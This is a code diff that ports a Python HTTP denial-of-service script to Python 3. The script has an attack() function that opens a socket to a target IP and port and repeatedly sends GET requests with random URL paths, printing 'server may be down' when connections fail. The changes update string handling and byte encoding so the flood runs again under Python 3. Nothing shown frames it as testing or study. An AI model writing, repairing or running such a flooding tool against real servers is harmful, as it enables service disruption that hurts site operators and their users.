@@ -51,7 +51,7 @@ def print_status():
 
 # Generate URL Path
 def generate_url_path():
-    msg = str(string.letters + string.digits + string.punctuation)
+    msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, 5))
     return data
 
@@ -67,11 +67,13 @@ def attack():
     try:
         # Open the connection on that raw socket
         dos.connect((ip, port))
-
+        
         # Send the request according to HTTP spec
-        dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
+        output = f"GET {url_path} HTTP/1.1\nHost: {host}\n\n"
+        dos.send(output.encode('utf-8'))
+        # dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
     except socket.error as e:
-        print("\n [ No connection, server may be down ]: " + str(e))
+        print("\n [No connection, server may be down]: " + str(e))
     finally:
         # Close our socket gracefully
         dos.shutdown(socket.SHUT_RDWR)
